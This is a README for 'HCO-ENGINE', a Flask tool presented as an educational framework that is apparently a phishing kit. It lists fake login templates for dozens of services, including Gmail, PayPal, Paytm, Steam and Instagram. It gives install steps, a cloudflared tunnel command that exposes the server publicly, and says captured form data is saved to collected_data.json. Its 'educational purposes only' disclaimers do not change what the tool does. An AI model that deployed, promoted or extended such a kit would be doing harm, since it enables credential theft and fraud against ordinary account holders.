# HCO-ENGINE 🛠️

Welcome to **HCO-ENGINE**, an educational Python-based web framework designed for learning Flask, threading, and real-time web interaction. This project demonstrates dynamic web forms, multi-step input handling, and terminal output with **Rich** tables and panels.

> ⚠️ **Disclaimer:** This project is for **educational purposes only**. Do not use it to collect real credentials or attack systems. Use only in local environments or sandboxed networks.

---

# Table of Contents 📑

- [Features](#features-⏩)  
- [Prerequisites](#prerequisites)  
- [Installation](#installation-⛏️)  
- [Usage](#usage-🧾)  
- [Supported Platforms](#supported-platforms-🖥️)  
- [Credits](#credits-💳)  

---

# Features ⏩

- Multi-platform template support  
- Real-time terminal output with `rich`  
- Multi-step form capture simulation  
- Terminal banners & UI with `pyfiglet` and `colorama`  
- Background tasks demo with threading  
- Optional local tunneling via `cloudflared`  

---

# Prerequisites

- Python 3.8+  
- pip (Python package manager)  
- Git (optional for cloning)  
- Cloudflared (optional, for local tunneling)  

---

# Installation ⛏️

## Termux
```bash
pkg update && pkg upgrade -y  
pkg install python git cloudflared -y  
git clone (....)  
cd HCO-ENGINE  
pip install --upgrade pip  
pip install Flask colorama rich pyfiglet  
```
## Linux (Ubuntu/Debian)
```bash
sudo apt update && sudo apt upgrade -y  
sudo apt install -y python3 python3-pip git cloudflared  
git clone (....) 
cd HCO-ENGINE  
python3 -m venv venv  
source venv/bin/activate  
pip install --upgrade pip  
pip install Flask colorama rich pyfiglet  
```
## Kali Linux
```bash
sudo apt update && sudo apt upgrade -y  
sudo apt install -y python3 python3-pip git cloudflared  
git clone (....)
cd HCO-ENGINE  
python3 -m venv venv  
source venv/bin/activate  
pip install --upgrade pip  
pip install Flask colorama rich pyfiglet  
```
---

# Usage 🧾

1. Run the engine:
```bash
python HCO-ENGINE.py
```
2. Terminal Banner: Shows a styled HCO banner.

3. Select Platform: Pick a platform from the terminal list.

4. Flask Server: Starts locally at:

http://127.0.0.1:5000

5. Optional Cloudflare Tunnel: To expose server externally:

cloudflared tunnel --url http://127.0.0.1:5000

6. View Data: Submitted form data is displayed in terminal tables and saved locally in collected_data.json.

---

# Supported Platforms 🖥️

Social: Facebook, Instagram, Twitter, Snapchat, TikTok, LinkedIn, Reddit, Quora, Pinterest  
Messaging: Telegram, WhatsApp, Messenger, Discord, Signal, Viber, Skype, Line, Kik  
Email: Gmail, Yahoo Mail, Outlook, ProtonMail, Zoho Mail, iCloud Mail, GMX, Yandex, Mail.com  
Payments: PayPal, Paytm, Google Pay, PhonePe, Easypaisa, JazzCash, Venmo, Cash App, Stripe, Skrill, Neteller  
Gaming: PUBG Mobile, FreeFire, Fortnite, Steam, Roblox, Minecraft, Valorant, Apex Legends, Call of Duty, Epic Games  
Streaming: Netflix, Hulu, Disney+, Twitch, YouTube, Spotify, Apple Music, SoundCloud, Hotstar, Voot  
Others: GitHub, GitLab, Stack Overflow, Notion, Wordpress, Slack, Zoom, Google Drive, Dropbox, OneDrive  

> ⚠️ Note: For educational and testing purposes only. Do not use real accounts.

---

# Credits 💳

HCO-GHOST: THE KING OF DIGITAL WORLD
Hackers colony official: Core development and maintenance  
YouTube Channel: Tutorials & guides — Hackers colony tech YouTube (https://youtube.com/@hackers_colony_tech)
Community: HACKERS COLONY discussion & learning — WhatsApp Group (https://chat.whatsapp.com/HB03qdGSK5K17wmQ5FXGiP?mode=ems_copy_c)

---

# Greetings 🤗

Special thanks to the open-source community and everyone supporting ethical hacking and cybersecurity learning!
